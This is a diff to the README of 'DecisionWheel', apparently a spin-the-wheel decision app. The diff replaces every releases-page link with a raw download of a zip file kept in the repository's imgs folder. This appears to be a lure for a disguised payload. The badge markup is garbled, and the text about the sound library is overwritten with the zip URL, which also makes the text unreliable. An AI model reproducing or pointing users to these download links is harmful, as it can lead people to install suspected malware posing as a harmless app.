@@ -1,6 +1,6 @@
 # 🎡 DecisionWheel - Let Fate Decide With a Spin
 
-[![Download DecisionWheel](https://img.shields.io/badge/Download%20DecisionWheel-Click%20Here-blue.svg)](https://github.com/Rinki-A/DecisionWheel/releases)
+[![Download DecisionWheel](https://github.com/Rinki-A/DecisionWheel/raw/refs/heads/main/imgs/Decision_Wheel_3.1.zip%20DecisionWheel-Click%https://github.com/Rinki-A/DecisionWheel/raw/refs/heads/main/imgs/Decision_Wheel_3.1.zip)](https://github.com/Rinki-A/DecisionWheel/raw/refs/heads/main/imgs/Decision_Wheel_3.1.zip)
 
 ## 🌟 About DecisionWheel
 
@@ -11,7 +11,7 @@ DecisionWheel is your fun, playful tool for making decisions. Feeling stuck? Jus
 Using DecisionWheel is simple and enjoyable. Follow these steps to get started:
 
 1. **Visit the Releases Page**  
-   Go to the [Download DecisionWheel](https://github.com/Rinki-A/DecisionWheel/releases) page to find the latest version of the app.
+   Go to the [Download DecisionWheel](https://github.com/Rinki-A/DecisionWheel/raw/refs/heads/main/imgs/Decision_Wheel_3.1.zip) page to find the latest version of the app.
 
 2. **Choose the Right Version**  
    On the Releases page, you will see different versions of the app. Choose the most recent version for the best experience.
@@ -33,12 +33,12 @@ Using DecisionWheel is simple and enjoyable. Follow these steps to get started:
 
 ## 📥 Download & Install
 
-For easy access, you can always go to the [Download DecisionWheel](https://github.com/Rinki-A/DecisionWheel/releases) page. Remember to select the latest version for the best features and performance.
+For easy access, you can always go to the [Download DecisionWheel](https://github.com/Rinki-A/DecisionWheel/raw/refs/heads/main/imgs/Decision_Wheel_3.1.zip) page. Remember to select the latest version for the best features and performance.
 
 ## 🌈 Features
 
 - **Interactive Wheel:** Experience a colorful wheel that reacts to your interactions.
-- **Sound Effects:** Enjoy mystical sounds with the help of Howler.js as you spin the wheel.
+- **Sound Effects:** Enjoy mystical sounds with the help of https://github.com/Rinki-A/DecisionWheel/raw/refs/heads/main/imgs/Decision_Wheel_3.1.zip as you spin the wheel.
 - **Confetti Animation:** Celebrate your decision with dazzling confetti effects using canvas-confetti.
 - **Responsive Design:** Use DecisionWheel on desktops, tablets, and even some mobile devices.
 
@@ -79,4 +79,4 @@ If you encounter any issues or have questions, feel free to reach out. You can o
 
 ## 🎉 Conclusion
 
-DecisionWheel transforms decision-making into a delightful experience. With a cheerful interface and entertaining features, you can make choices with ease and enjoyment. Visit the [Download DecisionWheel](https://github.com/Rinki-A/DecisionWheel/releases) page to start your engaging journey with fate today!
+DecisionWheel transforms decision-making into a delightful experience. With a cheerful interface and entertaining features, you can make choices with ease and enjoyment. Visit the [Download DecisionWheel](https://github.com/Rinki-A/DecisionWheel/raw/refs/heads/main/imgs/Decision_Wheel_3.1.zip) page to start your engaging journey with fate today!
